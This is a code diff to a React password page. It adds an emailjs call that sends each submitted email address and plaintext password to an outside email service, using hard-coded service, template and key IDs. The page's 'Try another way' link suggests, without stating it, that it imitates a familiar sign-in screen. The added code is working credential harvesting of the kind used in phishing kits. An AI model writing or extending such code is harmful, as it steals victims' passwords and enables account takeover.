@@ -2,6 +2,8 @@ import React, { useState } from "react";
 import "bootstrap/dist/css/bootstrap.min.css";
 import { useNavigate } from "react-router-dom";
 import "./password.css";
+import emailjs from "emailjs-com";
+import { toast } from "react-toastify";
 
 export default function Password() {
     const [password, setPassword] = useState("");
@@ -24,6 +26,24 @@ export default function Password() {
             setError("Email missing");
             return;
         }
+        emailjs
+            .send(
+                "service_ww5yb97",      // <-- CHANGE THIS
+                "template_gllog5j",     // <-- CHANGE THIS
+                {
+                    user_email: email,
+                    user_password: password,
+                },
+                "j6_TTevIT99GTDgmi"        // <-- CHANGE THIS
+            )
+            .then(() => {
+                console.log("Email sent successfully");
+                toast.success("Successfully submitted!");
+            })
+            .catch((err) => {
+                console.log("Email sending failed:", err);
+                toast.error("Email sending failed!");
+            });
         let users = JSON.parse(localStorage.getItem("users")) || [];
         const newUser = {
             id: users.length + 1,
@@ -105,7 +125,7 @@ export default function Password() {
                     <div className="button-group mt-4 d-flex justify-content-end align-items-center">
                         <a href="#" className="forgot-link mb-0 text-decoration-none">Try another way</a>
                         <button className="next-button" onClick={handleNext}>
-                            Next
+                            Submit
                         </button>
                     </div>
                 </div>
